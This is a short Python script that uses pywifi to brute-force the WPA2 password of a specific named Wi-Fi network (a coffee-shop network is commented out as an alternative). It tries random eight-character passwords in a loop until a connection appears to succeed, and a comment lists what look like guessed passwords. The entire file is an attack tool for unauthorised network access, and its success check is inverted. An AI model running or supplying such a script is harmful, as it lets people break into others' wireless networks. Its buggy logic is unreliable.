import pywifi
from pywifi import const 
import time
import datetime
import string,random

src_upp = string.ascii_uppercase
src_let = string.ascii_lowercase
src_num = string.digits
ps = {}


def wifi(pwd):
    wf = pywifi.PyWiFi()
    ifaces = wf.interfaces()[0]
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = 'ChinaNGB-yd7FJK'  #3E0li8aY PUM8x56O
        # profile.ssid = 'FACT Coffee'
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = pwd
        ifaces.remove_all_network_profiles()
        tep_profile = ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        time.sleep(2)
        if ifaces.status() == const.IFACE_DISCONNECTED:
            return True
        else:
            return False
    else:
        print('got it:',pwd)

def getPass():
    ptxt = ''
    while True:
        upp_c = random.randint(1,4)
        low_c = random.randint(1,8-upp_c-2)
        num_c = 8-(upp_c+low_c)
        password = random.sample(src_upp,upp_c)+random.sample(src_let,low_c)+random.sample(src_num,num_c)
        password = random.sample(src_let,4)+random.sample(src_num,4)
        random.shuffle(password)
        ptxt = ''.join(password)
        if ptxt not in ps:
            ps[ptxt] = ptxt
            break
    return ptxt

def readPass():
    print('start')
    # file = open(r'C:\\Users\\cheng.long\\study\\pass.txt','r')
    while True:
        try:
            # pad = file.readline()
            pad = getPass()
            print('try ptxt:',pad)
            res = wifi(pad)
            if res:
                print('connected :',res,pad)
                break 
        except Exception as e:
            print('err:',e)
            continue
    print('end')
if __name__ == "__main__":
    readPass()